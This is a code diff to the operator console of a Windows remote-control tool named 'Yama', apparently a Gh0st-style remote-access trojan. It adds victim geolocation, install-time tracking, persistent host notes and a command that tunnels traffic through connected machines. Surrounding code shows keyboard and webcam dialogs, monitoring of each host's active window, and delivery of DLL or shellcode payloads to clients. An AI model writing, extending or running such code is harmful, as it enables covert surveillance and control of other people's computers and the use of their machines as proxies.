@@ -23,9 +23,12 @@
 #include "InputDlg.h"
 #include "CPasswordDlg.h"
 #include "pwd_gen.h"
+#include "parse_ip.h"
+#include <proxy/ProxyMapDlg.h>
 #include "DateVerify.h"
 #include <fstream>
 #include "common/skCrypter.h"
+#include "common/commands.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -38,22 +41,6 @@
 #define UM_ICONNOTIFY WM_USER+100
 #define TIMER_CHECK 1
 
-enum
-{
-	ONLINELIST_IP=0,          //IP的列顺序
-	ONLINELIST_ADDR,          //地址
-	ONLINELIST_COMPUTER_NAME, //计算机名/备注
-	ONLINELIST_OS,            //操作系统
-	ONLINELIST_CPU,           //CPU
-	ONLINELIST_VIDEO,         //摄像头(有无)
-	ONLINELIST_PING,           //PING(对方的网速)
-	ONLINELIST_VERSION,	       // 版本信息
-	ONLINELIST_LOGINTIME,      // 活动窗口
-	ONLINELIST_CLIENTTYPE,		// 客户端类型
-	ONLINELIST_MAX, 
-};
-
-
 typedef struct
 {
 	const char*   szTitle;     //列表的名称
@@ -64,15 +51,17 @@ const int  g_Column_Count_Online  = ONLINELIST_MAX; // 报表的列数
 
 COLUMNSTRUCT g_Column_Data_Online[g_Column_Count_Online] = 
 {
-	{"IP",				148	},
-	{"端口",			64	},
-	{"计算机名/备注",	160	},
-	{"操作系统",		256	},
+	{"IP",				130	},
+	{"端口",			60	},
+	{"地理位置",		130	},
+	{"计算机名/备注",	150	},
+	{"操作系统",		120	},
 	{"CPU",				80	},
-	{"摄像头",			72	},
-	{"PING",			100	},
-	{"版本",			80	},
-	{"活动窗口",		150 },
+	{"摄像头",			70	},
+	{"PING",			70	},
+	{"版本",			90	},
+	{"安装时间",        120 },
+	{"活动窗口",		140 },
 	{"类型",			50 },
 };
 
@@ -96,6 +85,52 @@ static UINT Indicators[] =
 {
 	IDR_STATUSBAR_STRING  
 };
+
+//////////////////////////////////////////////////////////////////////////
+
+// 保存 unordered_map 到文件
+void SaveToFile(const ComputerNoteMap& data, const std::string& filename)
+{
+	std::ofstream outFile(filename, std::ios::binary);  // 打开文件（以二进制模式）
+	if (outFile.is_open()) {
+		for (const auto& pair : data) {
+			outFile.write(reinterpret_cast<const char*>(&pair.first), sizeof(ClientKey));  // 保存 key
+			int valueSize = pair.second.GetLength();
+			outFile.write(reinterpret_cast<const char*>(&valueSize), sizeof(int));  // 保存 value 的大小
+			outFile.write((char*)&pair.second, valueSize);  // 保存 value 字符串
+		}
+		outFile.close();
+	}
+	else {
+		Mprintf("Unable to open file '%s' for writing!\n", filename.c_str());
+	}
+}
+
+// 从文件读取 unordered_map 数据
+void LoadFromFile(ComputerNoteMap& data, const std::string& filename)
+{
+	std::ifstream inFile(filename, std::ios::binary);  // 打开文件（以二进制模式）
+	if (inFile.is_open()) {
+		while (inFile.peek() != EOF) {
+			ClientKey key;
+			inFile.read(reinterpret_cast<char*>(&key), sizeof(ClientKey));  // 读取 key
+
+			int valueSize;
+			inFile.read(reinterpret_cast<char*>(&valueSize), sizeof(int));  // 读取 value 的大小
+
+			ClientValue value;
+			inFile.read((char*)&value, valueSize);  // 读取 value 字符串
+
+			data[key] = value;  // 插入到 map 中
+		}
+		inFile.close();
+	}
+	else {
+		Mprintf("Unable to open file '%s' for reading!\n", filename.c_str());
+	}
+}
+
+//////////////////////////////////////////////////////////////////////////
 
 class CAboutDlg : public CDialogEx
 {
@@ -139,6 +174,8 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(IOCPServer* iocpServer, CWnd* pParent): CDial
 	m_bmOnline[1].LoadBitmap(IDB_BITMAP_UPDATE);
 	m_bmOnline[2].LoadBitmap(IDB_BITMAP_DELETE);
 	m_bmOnline[3].LoadBitmap(IDB_BITMAP_SHARE);
+	m_bmOnline[4].LoadBitmap(IDB_BITMAP_PROXY);
+	m_bmOnline[5].LoadBitmap(IDB_BITMAP_HOSTNOTE);
 
 	InitializeCriticalSection(&m_cs);
 }
@@ -201,11 +238,14 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenVideoDialog)
 	ON_MESSAGE(WM_HANDLEMESSAGE, OnHandleMessage)
 	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyboardDialog)
+	ON_MESSAGE(WM_OPENPROXYDIALOG, OnOpenProxyDialog)
 	ON_MESSAGE(WM_UPXTASKRESULT, UPXProcResult)
 	ON_WM_HELPINFO()
 	ON_COMMAND(ID_ONLINE_SHARE, &CMy2015RemoteDlg::OnOnlineShare)
 	ON_COMMAND(ID_TOOL_AUTH, &CMy2015RemoteDlg::OnToolAuth)
 	ON_COMMAND(ID_TOOL_GEN_MASTER, &CMy2015RemoteDlg::OnToolGenMaster)
+	ON_COMMAND(ID_MAIN_PROXY, &CMy2015RemoteDlg::OnMainProxy)
+	ON_COMMAND(ID_ONLINE_HOSTNOTE, &CMy2015RemoteDlg::OnOnlineHostnote)
 END_MESSAGE_MAP()
 
 
@@ -380,29 +420,44 @@ std::vector<CString> SplitCString(CString strData) {
 
 
 VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, 
-							   CString strCPU, CString strVideo, CString strPing, CString ver, CString st, CString tp, CONTEXT_OBJECT* ContextObject)
+							   CString strCPU, CString strVideo, CString strPing, CString ver, 
+	CString startTime, const std::vector<std::string>& v, CONTEXT_OBJECT * ContextObject)
 {
 	EnterCriticalSection(&m_cs);
 	if (IsExitItem(m_CList_Online, (ULONG_PTR)ContextObject)) {
 		LeaveCriticalSection(&m_cs);
-		Mprintf(CString("===> '") + strIP + CString("' already exist!!\n"));
+		OutputDebugStringA(CString("===> '") + strIP + CString("' already exist!!\n"));
 		return;
 	}
-	//默认为0行  这样所有插入的新列都在最上面
-	int i = m_CList_Online.InsertItem(m_CList_Online.GetItemCount(),strIP);
-	auto vec = SplitCString(tp.IsEmpty() ? "DLL" : tp);
-	tp = vec[0];
-	m_CList_Online.SetItemText(i,ONLINELIST_ADDR,strAddr);
-	m_CList_Online.SetItemText(i,ONLINELIST_COMPUTER_NAME,strPCName); 
-	m_CList_Online.SetItemText(i,ONLINELIST_OS,strOS); 
-	m_CList_Online.SetItemText(i,ONLINELIST_CPU,strCPU);
-	m_CList_Online.SetItemText(i,ONLINELIST_VIDEO,strVideo);
-	m_CList_Online.SetItemText(i,ONLINELIST_PING,strPing); 
-	m_CList_Online.SetItemText(i, ONLINELIST_VERSION, ver);
-	m_CList_Online.SetItemText(i, ONLINELIST_LOGINTIME, st);
-	m_CList_Online.SetItemText(i, ONLINELIST_CLIENTTYPE, tp.IsEmpty()?"DLL":tp);
-	CString data[10] = { strIP, strAddr,strPCName,strOS,strCPU,strVideo,strPing,ver,st,tp };
+	LeaveCriticalSection(&m_cs);
+
+	CString install = v[6].empty() ? "?" : v[6].c_str(), path = v[4].empty() ? "?" : v[4].c_str();
+	CString data[ONLINELIST_MAX] = { strIP, strAddr, "", strPCName, strOS, strCPU, strVideo, strPing, 
+		ver, install, startTime, v[0].empty() ? "?" : v[0].c_str(), path };
+	auto id = CONTEXT_OBJECT::CalculateID(data);
+	bool modify = false;
+	CString loc = GetClientMapData(id, MAP_LOCATION);
+	if (loc.IsEmpty()) {
+		loc = GetGeoLocation(data[ONLINELIST_IP].GetString()).c_str();
+		if (!loc.IsEmpty()) {
+			modify = true;
+			SetClientMapData(id, MAP_LOCATION, loc);
+		}
+	}
+	data[ONLINELIST_LOCATION] = loc;
 	ContextObject->SetClientInfo(data);
+	ContextObject->SetID(id);
+
+	EnterCriticalSection(&m_cs);
+	if (modify)
+		SaveToFile(m_ClientMap, DB_FILENAME);
+	auto& m = m_ClientMap[ContextObject->ID];
+	int i = m_CList_Online.InsertItem(m_CList_Online.GetItemCount(), strIP);
+	for (int n = ONLINELIST_ADDR; n <= ONLINELIST_CLIENTTYPE; n++) {
+		n == ONLINELIST_COMPUTER_NAME ? 
+			m_CList_Online.SetItemText(i, n, m.GetNote()[0] ? m.GetNote() : data[n]) :
+			m_CList_Online.SetItemText(i, n, data[n].IsEmpty() ? "?" : data[n]);
+	}
 	m_CList_Online.SetItemData(i,(DWORD_PTR)ContextObject);
 
 	ShowMessage(true,strIP+"主机上线");
@@ -478,6 +533,7 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 	}
 	// 将“关于...”菜单项添加到系统菜单中。
 	SetWindowText(_T("Yama"));
+	LoadFromFile(m_ClientMap, DB_FILENAME);
 
 	// IDM_ABOUTBOX 必须在系统命令范围内。
 	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
@@ -786,6 +842,8 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
 	Menu.SetMenuItemBitmaps(ID_ONLINE_UPDATE, MF_BYCOMMAND, &m_bmOnline[1], &m_bmOnline[1]);
 	Menu.SetMenuItemBitmaps(ID_ONLINE_DELETE, MF_BYCOMMAND, &m_bmOnline[2], &m_bmOnline[2]);
 	Menu.SetMenuItemBitmaps(ID_ONLINE_SHARE, MF_BYCOMMAND, &m_bmOnline[3], &m_bmOnline[3]);
+	Menu.SetMenuItemBitmaps(ID_MAIN_PROXY, MF_BYCOMMAND, &m_bmOnline[4], &m_bmOnline[4]);
+	Menu.SetMenuItemBitmaps(ID_ONLINE_HOSTNOTE, MF_BYCOMMAND, &m_bmOnline[5], &m_bmOnline[5]);
 	SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);
 
 	*pResult = 0;
@@ -1218,6 +1276,11 @@ VOID CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
 		Dlg->OnReceiveComplete();
 		break;
 	}
+	case PROXY_DLG: {
+		CProxyMapDlg* Dlg = (CProxyMapDlg*)ContextObject->hDlg;
+		Dlg->OnReceiveComplete();
+		break;
+	}
 	default: {
 		HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 		if (hEvent == NULL) {
@@ -1276,6 +1339,11 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 	}
 	switch (ContextObject->InDeCompressedBuffer.GetBYTE(0))
 	{
+	case COMMAND_PROXY:
+	{
+		g_2015RemoteDlg->SendMessage(WM_OPENPROXYDIALOG, 0, (LPARAM)ContextObject);
+		break;
+	}
 	case TOKEN_HEARTBEAT: case 137:
 		UpdateActiveWindow(ContextObject);
 		break;
@@ -1285,7 +1353,11 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 		int typ = (len > 2 ? ContextObject->InDeCompressedBuffer.GetBYTE(2) : MEMORYDLL);
 		bool isRelease = len > 3 ? ContextObject->InDeCompressedBuffer.GetBYTE(3) : true;
 		int connNum = 0;
-		Mprintf("===> '%s' Request DLL [is64Bit:%d isRelease:%d]\n", ContextObject->RemoteAddr().c_str(), is64Bit, isRelease);
+		if (typ == SHELLCODE) {
+			Mprintf("===> '%s' Request SC [is64Bit:%d isRelease:%d]\n", ContextObject->RemoteAddr().c_str(), is64Bit, isRelease);
+		} else {
+			Mprintf("===> '%s' Request DLL [is64Bit:%d isRelease:%d]\n", ContextObject->RemoteAddr().c_str(), is64Bit, isRelease);
+		}
 		char version[12] = {};
 		ContextObject->InDeCompressedBuffer.CopyBuffer(version, 12, 4);
 		SendServerDll(ContextObject, is64Bit);
@@ -1414,8 +1486,8 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
 		strVideo = m_settings.DetectSoftware ? "无" : LoginInfor->bWebCamIsExist ? "有" : "无";
 
 		strAddr.Format("%d", nSocket);
-		AddList(strIP,strAddr,strPCName,strOS,strCPU,strVideo,strPing,LoginInfor->moduleVersion,LoginInfor->szStartTime, 
-			LoginInfor->szReserved,ContextObject);
+		auto v = LoginInfor->ParseReserved(10);
+		AddList(strIP,strAddr,strPCName,strOS,strCPU,strVideo,strPing,LoginInfor->moduleVersion,LoginInfor->szStartTime, v, ContextObject);
 		delete LoginInfor;
 		return S_OK;
 	}catch(...){
@@ -1540,8 +1612,7 @@ void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx) {
 			m_CList_Online.SetItemText(i, ONLINELIST_LOGINTIME, hb.ActiveWnd);
 			if (hb.Ping > 0)
 				m_CList_Online.SetItemText(i, ONLINELIST_PING, std::to_string(hb.Ping).c_str());
-			if (m_settings.DetectSoftware)
-				m_CList_Online.SetItemText(i, ONLINELIST_VIDEO, hb.HasSoftware ? "有" : "无");
+			m_CList_Online.SetItemText(i, ONLINELIST_VIDEO, hb.HasSoftware ? "有" : "无");
 			return;
 		}
 	}
@@ -1753,6 +1824,20 @@ LRESULT CMy2015RemoteDlg::OnOpenKeyboardDialog(WPARAM wParam, LPARAM lParam)
 	return 0;
 }
 
+LRESULT CMy2015RemoteDlg::OnOpenProxyDialog(WPARAM wParam, LPARAM lParam)
+{
+	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
+
+	CProxyMapDlg* Dlg = new CProxyMapDlg(this, m_iocpServer, ContextObject);
+	Dlg->Create(IDD_PROXY, GetDesktopWindow());
+	Dlg->ShowWindow(SW_SHOW);
+
+	ContextObject->v1 = PROXY_DLG;
+	ContextObject->hDlg = Dlg;
+
+	return 0;
+}
+
 BOOL CMy2015RemoteDlg::OnHelpInfo(HELPINFO* pHelpInfo)
 {
 	MessageBox("Copyleft (c) FTU 2025", "关于");
@@ -1801,6 +1886,55 @@ void CMy2015RemoteDlg::OnToolAuth()
 	dlg.m_sDeviceID = deviceID.c_str();
 
 	dlg.DoModal();
+}
+
+void CMy2015RemoteDlg::OnMainProxy()
+{
+	EnterCriticalSection(&m_cs);
+	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
+	while (Pos)
+	{
+		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
+		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
+		BYTE cmd[] = { COMMAND_PROXY };
+		m_iocpServer->OnClientPreSending(ContextObject, cmd, sizeof(cmd));
+		break;
+	}
+	LeaveCriticalSection(&m_cs);
+}
+
+void CMy2015RemoteDlg::OnOnlineHostnote()
+{
+	CInputDialog dlg(this);
+	dlg.Init("修改备注", "请输入主机备注: ");
+	if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty()) {
+		return;
+	}
+	if (dlg.m_str.GetLength() >= 64) {
+		MessageBox("备注信息长度不能超过64个字符", "提示", MB_ICONINFORMATION);
+		dlg.m_str = dlg.m_str.Left(63);
+	}
+	BOOL modified = FALSE;
+	uint64_t key = 0;
+	EnterCriticalSection(&m_cs);
+	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
+	while (Pos) {
+		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
+		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
+		auto f = m_ClientMap.find(ContextObject->ID);
+		if (f == m_ClientMap.end())
+			m_ClientMap[ContextObject->ID] = ClientValue("", dlg.m_str);
+		else
+			m_ClientMap[ContextObject->ID].UpdateNote(dlg.m_str);
+		m_CList_Online.SetItemText(iItem, ONLINELIST_COMPUTER_NAME, dlg.m_str);
+		modified = TRUE;
+	}
+	LeaveCriticalSection(&m_cs);
+	if (modified) {
+		EnterCriticalSection(&m_cs);
+		SaveToFile(m_ClientMap, DB_FILENAME);
+		LeaveCriticalSection(&m_cs);
+	}
 }
 
 
